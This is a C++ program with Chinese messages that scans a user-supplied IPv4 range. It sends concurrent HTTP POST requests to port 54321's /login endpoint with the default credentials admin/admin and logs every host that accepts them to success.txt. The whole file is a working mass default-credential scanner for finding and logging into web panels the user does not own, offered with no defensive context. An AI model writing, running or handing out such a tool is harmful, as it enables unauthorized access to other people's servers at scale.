#include <iostream>
#include <curl/curl.h>
#include <sstream>
#include <string>
#include <future>
#include <fstream>
#include <vector>
#include <cstdio>
#include "nlohmann/json.hpp"

using json = nlohmann::json;

std::mutex file_mutex;

unsigned long success = 0;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

unsigned long ip_to_number(const std::string& ip) {
    unsigned long result = 0;
    std::istringstream iss(ip);
    std::string segment;
    int segment_int;

    int expected_segments = 4;
    while (std::getline(iss, segment, '.')) {
        try {
            segment_int = std::stoi(segment);
            if (segment_int < 0 || segment_int > 255) {
                throw std::invalid_argument("区间范围只能在0-255内");
            }
            result = (result << 8) + segment_int;
            --expected_segments;
        } catch (const std::invalid_argument& e) {
            std::cerr << "输入的IP段有误: " << e.what() << std::endl;
            return 0;
        } catch (const std::out_of_range& e) {
            std::cerr << "数值超出了整数范围: " << e.what() << std::endl;
            return 0;
        }
    }

    if (expected_segments != 0) {
        std::cerr << "输入的IP地址格式不正确！" << std::endl;
        return 0;
    }

    return result;
}

std::string number_to_ip(unsigned long number) {
    std::ostringstream oss;
    for (int i = 3; i >= 0; --i) {  
        oss << ((number >> (i * 8)) & 0xFF);
        if (i > 0)
            oss << ".";
    }
    return oss.str();
}
std::vector<std::string> generate_ips(const std::string& start_ip, const std::string& end_ip){
    std::vector<std::string> result;
    unsigned long start = ip_to_number(start_ip);
    unsigned long end = ip_to_number(end_ip);

    if (start == 0 || end == 0) {
        std::cerr << "无效的IP地址" << std::endl;
        return {};
    }

    if (start > end) {
        std::cerr << "起始IP必须小于等于结束IP" << std::endl;
        return {};
    }

    for (unsigned long ip = start; ip <= end; ip++) {
        result.push_back(number_to_ip(ip));
    }

    return result;
}

void sendRequest(const std::string& ip, std::ofstream& file){
    const std::string url = "http://" + ip + ":54321/login";
    
    CURL *curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();

    if (curl) {
        const std::string postfield = "username=admin&password=admin";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfield.c_str());

        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);


        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        std::cout << "正在尝试 " << ip << "\n";

        if(res == CURLE_OK) {
            try {
                json j = json::parse(response);
                if (j["success"].get<bool>()) {
                	std::lock_guard<std::mutex> lock(file_mutex);
                    file << ip << "\n";
                    ++success;
                    std::cout << ip << " 成功" << std::endl;
                }
            } catch (json::parse_error &e) {
                std::cerr << "JSON 解析错误: " << e.what() << std::endl;
            }
        } 
/*
        else {
            std::cerr << "curl_easy_perform() 失败: " << curl_easy_strerror(res) << std::endl;
        }
*/
        curl_easy_cleanup(curl);
    } else {
        std::cerr << "curl初始化失败" << std::endl;
    }

}

int main(int argc, char *argv[]){
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <start_ip> <end_ip> <concurrent_number>" << std::endl;
        return 1;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);

    std::string start_ip = argv[1];
    std::string end_ip = argv[2];

    std::vector<std::string> ips = generate_ips(start_ip, end_ip);

    std::ofstream output("success.txt", std::ios::app);

    const int max_concurrent_requests = std::stoi(argv[3]);
	std::vector<std::future<void>> futures;

	for (size_t i = 0; i < ips.size(); ++i) {
    if (futures.size() >= max_concurrent_requests) {
        for (auto &f : futures) {
            f.get();
        }
        futures.clear(); 
    }
    futures.push_back(std::async(std::launch::async, sendRequest, ips[i], std::ref(output)));
	}

	for (auto &f : futures) {
    	f.get();
	}


    output.close();

    std::cout << "总共成功 " << success << " 次" << std::endl;

    curl_global_cleanup();

    return 0;
}